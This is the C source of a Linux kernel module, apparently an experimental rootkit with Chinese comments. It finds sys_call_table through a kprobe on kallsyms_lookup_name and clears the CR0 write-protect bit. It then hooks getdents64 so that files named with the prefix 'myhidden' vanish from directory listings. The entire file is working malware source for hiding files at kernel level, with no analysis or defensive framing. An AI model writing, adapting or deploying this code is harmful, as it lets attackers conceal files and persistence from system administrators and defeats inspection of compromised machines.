#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>

#define HIDE_ME "myhidden"

typedef long (*getdents64_t)(const struct pt_regs *pt_registers);
getdents64_t org_getdents64;
unsigned long * syscall_table;
static  unsigned long __lkm_order;

static struct 
kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

asmlinkage long 
fake_sys_getdents64(const struct pt_regs *pt_registers) {
  //返回值ret为缓冲区的大小
  int ret = org_getdents64(pt_registers);
  int err;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  //通过系统调用规则知道其是第二个参数
  struct linux_dirent64 *dirent = (struct linux_dirent64 *) pt_registers->si;
  unsigned long i = 0;

  if (ret <= 0) {
    return ret;
  }

  kdirent = kvzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL) {
    return ret;
  }
  //返回值err为复制区域的大小
  //我们处理的内存是用户态的内存，所以需要先把它移到内核中拷贝到内核中便于我们遍历检查
  err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);
  if (err) {
    kvfree(kdirent);
    return ret;
  }

  while (i < ret) {
   dir = (void*) kdirent + i;
   //对返回区域逐一比对，注意按规则修改相应的d_reclen(文件名的长度)值
   if (memcmp(HIDE_ME, (char *)dir->d_name, strlen(HIDE_ME)) == 0) {
     printk(KERN_ALERT "mytest found the HIDE_ME file");
     if (dir == kdirent) {
       //如果是第一个目录，需要特殊处理
       //返回值ret需要减去当前目录名的大小
       ret -= dir->d_reclen;
       //整体前移
       memmove(dir, (void*)dir + dir->d_reclen, ret);
       continue;
     }
     //越过当前项
     prev->d_reclen += dir->d_reclen;
   }
   else {
     prev = dir;
   }
   i += dir->d_reclen;
  }
  //将检查过的缓冲区写回用户态
  err = copy_to_user(dirent, kdirent, (unsigned long) ret);
  if (err) {
    kvfree(kdirent);
    return ret;
  }
  return ret;
}

// extern unsigned long __force_order;
static inline void mywrite_cr0(unsigned long value) {
    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__lkm_order));
}
       

static unsigned long * get_syscall_table(void) {
  /*定义和kallsyms_lookup_name函数相同参数和返回值的函数，方便接受kprobe返回的函数地址*/
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;

  /*注册*/
  register_kprobe(&kp);

  /* assign kallsyms_lookup_name symbol to kp.addr */
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    
  /*注销*/
  unregister_kprobe(&kp);
  return (unsigned long *) kallsyms_lookup_name("sys_call_table");
}

static int __init replace_getdents_syscall(void) {
  unsigned long orig_cr0;
  syscall_table = get_syscall_table();
  if (syscall_table == NULL) {
    printk(KERN_ALERT "mytest replace_getdents_syscall: could not get syscall table address");
    return 0;
  }
  
  orig_cr0 = read_cr0();
  mywrite_cr0(orig_cr0 & (~0x10000));
  org_getdents64 = (getdents64_t)syscall_table[__NR_getdents64];
  syscall_table[__NR_getdents64] = (unsigned long int)fake_sys_getdents64;
  mywrite_cr0(orig_cr0);
  printk(KERN_ALERT "mycheck real_sys_getdents64 is :%p   +++  fake_sys_getdents64 is %p +++",(void *)org_getdents64,(void *)fake_sys_getdents64);
  return 0;
}

static void __exit clear(void) {
  unsigned long orig_cr0;
  if (syscall_table != 0) {
    orig_cr0 = read_cr0();
    mywrite_cr0(orig_cr0 & (~0x10000));
    syscall_table[__NR_getdents64] = (long unsigned int) org_getdents64;
    mywrite_cr0(orig_cr0);
  }
}

module_init(replace_getdents_syscall);
module_exit(clear);
MODULE_LICENSE("GPL");